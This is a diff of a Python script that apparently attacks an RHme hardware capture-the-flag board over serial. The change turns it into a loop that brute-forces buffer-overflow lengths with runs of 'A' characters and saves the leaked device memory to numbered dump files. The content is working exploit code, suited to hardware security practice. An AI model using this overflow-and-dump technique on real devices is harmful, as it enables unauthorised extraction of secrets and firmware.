@@ -7,7 +7,8 @@ from rhme_utilities import *
 #---------------------------------------
 
 # Change this to configure the script
-dumpLength = 100
+lengthStart = 20
+lengthEnd = 23
 
 # Info and Style
 print("")
@@ -20,6 +21,7 @@ def main():
 	Serial_Flush()
 	
 	# Reach desired state
+	# Authenticate
 	sendCommand = "A" + crlf
 	serialPort.write(sendCommand.encode())
 	temp = serialPort.readline()
@@ -30,40 +32,38 @@ def main():
 
 	sendCommand = "R00063B4C" + crlf
 	serialPort.write(sendCommand.encode())
-	temp = serialPort.readline()
-	print(temp.decode())
-	temp = serialPort.readline()
-	print(temp.decode())
+	# Flush Serial
+	for f in range(0, 2):
+		temp = serialPort.readline()
+		print(temp.decode())
 
-	# Request reading
-	sendCommand = "R" + crlf
-	serialPort.write(sendCommand.encode())
-	temp = serialPort.readline()
-	print(temp.decode())
+	# Begin bruteforcing buffer overflow to dump memory
+	for loop in range(lengthStart, lengthEnd):
+		# Request reading
+		sendCommand = "R" + crlf
+		serialPort.write(sendCommand.encode())
+		temp = serialPort.readline()
 
-	sendCommand = "A"
-	for i in range(1, dumpLength):
-		sendCommand += "A"
-	sendCommand += crlf
-	serialPort.write(sendCommand.encode())
-	temp = serialPort.readline()
-	temp = serialPort.readline()
-	temp = serialPort.readline()
-	temp = serialPort.readline()
+		# Perform overflow
+		sendCommand = "A"
+		for fill in range(1, loop):
+			sendCommand += "A"
+		sendCommand += crlf
+		serialPort.write(sendCommand.encode())
+		# Flush Serial
+		for f in range(0, 4):
+			temp = serialPort.readline()
 
-	# Dump everything
-	dump = open(r"dumped", "wb")
-	temp = serialPort.read()
-	while temp not in [b'', b'\n', crlf]:
-		dump.write(temp)
-		#dump.write(f'{dtemp:x}')
+		# Dump everything
+		dump = open(r"dumps/dumped_" + f'{loop}', "wb")
 		temp = serialPort.read()
-	print("--- Memory Dumped ---")
-	dump.close()
-	temp = serialPort.readline()
-	print(temp.decode())
+		while temp != b'':
+			dump.write(temp)
+			temp = serialPort.read()
+		print("--- Memory Dumped ---")
+		dump.close()
 
-	print("I work!")
+	print("Job's done!")
 
 # Run Main
 if __name__ == '__main__':
